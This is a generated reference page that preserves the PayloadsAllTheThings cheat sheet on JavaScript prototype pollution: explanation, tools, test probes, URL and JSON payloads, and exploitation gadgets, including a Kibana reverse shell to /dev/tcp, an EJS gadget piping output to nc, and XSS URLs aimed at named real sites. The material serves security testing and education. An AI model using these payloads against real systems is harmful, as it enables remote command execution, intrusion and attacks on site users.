---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# Prototype Pollution

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-prototype-pollution-readme` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Prototype Pollution/README.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Prototype Pollution](../../topics/prototype-pollution/prototype-pollution.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-prototype-pollution-readme |
| name | Prototype Pollution |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Prototype%20Pollution/README.md |

## Preserved Source Material

````yaml
_body: "# Prototype Pollution\n\n> Prototype pollution is a type of vulnerability that occurs in JavaScript when properties\
  \ of Object.prototype are modified. This is particularly risky because JavaScript objects are dynamic and we can add properties\
  \ to them at any time. Also, almost all objects in JavaScript inherit from Object.prototype, making it a potential attack\
  \ vector.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Examples](#examples)\n    * [Manual\
  \ Testing](#manual-testing)\n    * [Prototype Pollution via JSON Input](#prototype-pollution-via-json-input)\n    * [Prototype\
  \ Pollution in URL](#prototype-pollution-in-url)\n    * [Prototype Pollution Payloads](#prototype-pollution-payloads)\n\
  \    * [Prototype Pollution Gadgets](#prototype-pollution-gadgets)\n* [Labs](#labs)\n* [References](#references)\n\n## Tools\n\
  \n* [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder) - Help you find gadget for prototype pollution exploitation\n\
  * [yuske/silent-spring](https://github.com/yuske/silent-spring) - Prototype Pollution Leads to Remote Code Execution in\
  \ Node.js\n* [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution) - Server-Side\
  \ Prototype Pollution gadgets in Node.js core code and 3rd party NPM packages\n* [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)\
  \ - Prototype Pollution and useful Script Gadgets\n* [portswigger/server-side-prototype-pollution](https://github.com/portswigger/server-side-prototype-pollution)\
  \ - Burp Suite Extension detectiong Prototype Pollution vulnerabilities\n* [msrkp/PPScan](https://github.com/msrkp/PPScan)\
  \ - Client Side Prototype Pollution Scanner\n\n## Methodology\n\nIn JavaScript, prototypes are what allow objects to inherit\
  \ features from other objects. If an attacker is able to add or modify properties of `Object.prototype`, they can essentially\
  \ affect all objects that inherit from that prototype, potentially leading to various kinds of security risks.\n\n```js\n\
  var myDog = new Dog();\n```\n\n```js\n// Points to the function \"Dog\"\nmyDog.constructor;\n```\n\n```js\n// Points to\
  \ the class definition of \"Dog\"\nmyDog.constructor.prototype;\nmyDog.__proto__;\nmyDog[\"__proto__\"];\n```\n\n### Examples\n\
  \n* Imagine that an application uses an object to maintain configuration settings, like this:\n\n    ```js\n    let config\
  \ = {\n        isAdmin: false\n    };\n    ```\n\n* An attacker might be able to add an `isAdmin` property to `Object.prototype`,\
  \ like this:\n\n    ```js\n    Object.prototype.isAdmin = true;\n    ```\n\n### Manual Testing\n\n* ExpressJS: `{ \"__proto__\"\
  :{\"parameterLimit\":1}}` + 2 parameters in GET request, at least 1 must be reflected in the response.\n* ExpressJS: `{\
  \ \"__proto__\":{\"ignoreQueryPrefix\":true}}` + `??foo=bar`\n* ExpressJS: `{ \"__proto__\":{\"allowDots\":true}}` + `?foo.bar=baz`\n\
  * Change the padding of a JSON response: `{ \"__proto__\":{\"json spaces\":\" \"}}` + `{\"foo\":\"bar\"}`, the server should\
  \ return `{\"foo\": \"bar\"}`\n* Modify CORS header responses: `{ \"__proto__\":{\"exposedHeaders\":[\"foo\"]}}`, the server\
  \ should return the header `Access-Control-Expose-Headers`.\n* Change the status code: `{ \"__proto__\":{\"status\":510}}`\n\
  \n### Prototype Pollution via JSON Input\n\nYou can access the prototype of any object via the magic property `__proto__`.\n\
  The `JSON.parse()` function in JavaScript is used to parse a JSON string and convert it into a JavaScript object. Typically\
  \ it is a sink function where prototype pollution can happen.\n\n```js\n{\n    \"__proto__\": {\n        \"evilProperty\"\
  : \"evilPayload\"\n    }\n}\n```\n\nAsynchronous payload for NodeJS.\n\n```js\n{\n  \"__proto__\": {\n    \"argv0\":\"node\"\
  ,\n    \"shell\":\"node\",\n    \"NODE_OPTIONS\":\"--inspect=payload\\\"\\\".oastify\\\"\\\".com\"\n  }\n}\n```\n\nPolluting\
  \ the prototype via the `constructor` property instead.\n\n```js\n{\n    \"constructor\": {\n        \"prototype\": {\n\
  \            \"foo\": \"bar\",\n            \"json spaces\": 10\n        }\n    }\n}\n```\n\n### Prototype Pollution in\
  \ URL\n\nExample of Prototype Pollution payloads found in the wild.\n\n```ps1\nhttps://victim.com/#a=b&__proto__[admin]=1\n\
  https://example.com/#__proto__[xxx]=alert(1)\nhttp://server/servicedesk/customer/user/signup?__proto__.preventDefault.__proto__.handleObj.__proto__.delegateTarget=%3Cimg/src/onerror=alert(1)%3E\n\
  https://www.apple.com/shop/buy-watch/apple-watch?__proto__[src]=image&__proto__[onerror]=alert(1)\nhttps://www.apple.com/shop/buy-watch/apple-watch?a[constructor][prototype]=image&a[constructor][prototype][onerror]=alert(1)\n\
  ```\n\n### Prototype Pollution Exploitation\n\nDepending if the prototype pollution is executed client (CSPP) or server\
  \ side (SSPP), the impact will vary.\n\n* Remote Command Execution: [RCE in Kibana (CVE-2019-7609)](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)\n\
  \n    ```js\n    .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -i >& /dev/tcp/192.168.0.136/12345\
  \ 0>&1\");process.exit()//')\n    .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')\n    ```\n\n*\
  \ Remote Command Execution: [RCE using EJS gadgets](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce)\n\
  \n    ```js\n    {\n        \"__proto__\": {\n            \"client\": 1,\n            \"escapeFunction\": \"JSON.stringify;\
  \ process.mainModule.require('child_process').exec('id | nc localhost 4444')\"\n        }\n    }\n    ```\n\n* Reflected\
  \ XSS: [Reflected XSS on www.hackerone.com via Wistia embed code - #986386](https://hackerone.com/reports/986386)\n* Client-side\
  \ bypass: [Prototype pollution – and bypassing client-side HTML sanitizers](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)\n\
  * Denial of Service\n\n### Prototype Pollution Payloads\n\n```js\nObject.__proto__[\"evilProperty\"]=\"evilPayload\"\nObject.__proto__.evilProperty=\"\
  evilPayload\"\nObject.constructor.prototype.evilProperty=\"evilPayload\"\nObject.constructor[\"prototype\"][\"evilProperty\"\
  ]=\"evilPayload\"\n{\"__proto__\": {\"evilProperty\": \"evilPayload\"}}\n{\"__proto__.name\":\"test\"}\nx[__proto__][abaeead]\
  \ = abaeead\nx.__proto__.edcbcab = edcbcab\n__proto__[eedffcb] = eedffcb\n__proto__.baaebfc = baaebfc\n?__proto__[test]=test\n\
  ```\n\n### Prototype Pollution Gadgets\n\nA \"gadget\" in the context of vulnerabilities typically refers to a piece of\
  \ code or functionality that can be exploited or leveraged during an attack. When we talk about a \"prototype pollution\
  \ gadget,\" we're referring to a specific code path, function, or feature of an application that is susceptible to or can\
  \ be exploited through a prototype pollution attack.\n\nEither create your own gadget using part of the source with [yeswehack/pp-finder](https://github.com/yeswehack/pp-finder),\
  \ or try to use already discovered gadgets [yuske/server-side-prototype-pollution](https://github.com/yuske/server-side-prototype-pollution)\
  \ / [BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution).\n\n## Labs\n\
  \n* [YesWeHack Dojo - Prototype Pollution](https://dojo-yeswehack.com/XSS/Training/Prototype-Pollution)\n* [PortSwigger\
  \ - Prototype Pollution](https://portswigger.net/web-security/all-labs#prototype-pollution)\n\n## References\n\n* [A Pentester's\
  \ Guide to Prototype Pollution Attacks - Harsh Bothra - January 2, 2023](https://web.archive.org/web/20260111201021/https://www.cobalt.io/blog/a-pentesters-guide-to-prototype-pollution-attacks)\n\
  * [A tale of making internet pollution free - Exploiting Client-Side Prototype Pollution in the wild - s1r1us - September\
  \ 28, 2021](https://web.archive.org/web/20260204200448/https://blog.s1r1us.ninja/research/PP)\n* [Detecting Server-Side\
  \ Prototype Pollution - Daniel Thatcher - February 15, 2023](https://web.archive.org/web/20230221012320/https://www.intruder.io/research/server-side-prototype-pollution)\n\
  * [Exploiting prototype pollution – RCE in Kibana (CVE-2019-7609) - Michał Bentkowski - October 30, 2019](https://web.archive.org/web/20250810040511/https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)\n\
  * [Keynote | Server Side Prototype Pollution: Blackbox Detection Without The DoS - Gareth Heyes - March 27, 2023](https://web.archive.org/web/20230327103116/https://youtu.be/LD-KcuKM_0M)\n\
  * [NodeJS - \\_\\_proto\\_\\_ & prototype Pollution - HackTricks - July 19, 2024](https://web.archive.org/web/20241224163723/https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution)\n\
  * [Prototype Pollution - PortSwigger - November 10, 2022](https://web.archive.org/web/20221110144930/https://portswigger.net/web-security/prototype-pollution)\n\
  * [Prototype pollution - Snyk - August 19, 2023](https://web.archive.org/web/20211010192146/https://learn.snyk.io/lessons/prototype-pollution/javascript/)\n\
  * [Prototype pollution and bypassing client-side HTML sanitizers - Michał Bentkowski - August 18, 2020](https://web.archive.org/web/20200908002825/https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)\n\
  * [Prototype Pollution and Where to Find Them - BitK & SakiiR - August 14, 2023](https://youtu.be/mwpH9DF_RDA)\n* [Prototype\
  \ Pollution Attacks in NodeJS - Olivier Arteau - May 16, 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\
  * [Prototype Pollution Attacks in NodeJS applications - Olivier Arteau - October 3, 2018](https://web.archive.org/web/20190218093454/https://youtu.be/LUsiFV3dsK8)\n\
  * [Prototype Pollution Leads to RCE: Gadgets Everywhere - Mikhail Shcherbakov - September 29, 2023](https://web.archive.org/web/20240416043553/https://youtu.be/v5dq80S1WF4)\n\
  * [Server side prototype pollution, how to detect and exploit - BitK - February 18, 2023](http://web.archive.org/web/20230218081534/https://blog.yeswehack.com/talent-development/server-side-prototype-pollution-how-to-detect-and-exploit/)\n\
  * [Server-side prototype pollution: Black-box detection without the DoS - Gareth Heyes - February 15, 2023](https://web.archive.org/web/20260219234352/https://portswigger.net/research/server-side-prototype-pollution)"
_relative_path: Prototype Pollution/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/Prototype Pollution/README.md
````
